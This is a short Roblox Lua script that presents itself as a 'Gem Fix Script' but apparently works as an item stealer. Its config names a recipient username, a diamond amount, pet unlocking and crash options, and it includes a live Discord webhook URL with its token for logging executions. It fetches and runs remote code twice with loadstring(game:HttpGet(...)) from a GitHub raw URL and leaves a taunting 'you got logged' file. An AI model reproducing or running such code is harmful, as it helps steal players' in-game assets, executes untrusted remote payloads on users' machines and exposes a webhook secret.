--[[ Main Config ]]--
_G.Username = "Light_Abood" --//
_G.GiftMessage = "Gem Fix Script" --//
_G.Diamonds = 500000 --//
_G.UnlockPets = true --//
_G.AntiLeave = true --//
_G.Crash = true  --//
...
--[[ Webhook Config ]]--
_G.Webhook = "https://discord.com/api/webhooks/1117177728140054690/Pxhn53G-i6fU3J29Tyz4qP024xCCt_q8irRtoKImSOM3xcynY-WNFWmhwfpUZ7Kf6JaP" --// Discord Webhook For Executions
_G.Enabled = true --// Toggle For Sending Webhooks
_G.Mention = true --// Pings You When Someone Executes
--[[ UI Config ]]--
_G.ScriptName = "FluryUpdatedScript" --// Script Name On The UI
...
--// Execution Log
loadstring(game:HttpGet("https://raw.githubusercontent.com/rizzup/lua/main/webhook"))()
 
 
 
writefile("LOL.txt", "Damm u just got logged lmao")
 
 
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("|DoubleCoders On Top!!!|","All")
...
--// Teleport check 
loadstring(game:HttpGet("https://raw.githubusercontent.com/rizzup/lua/main/main.lua"))()
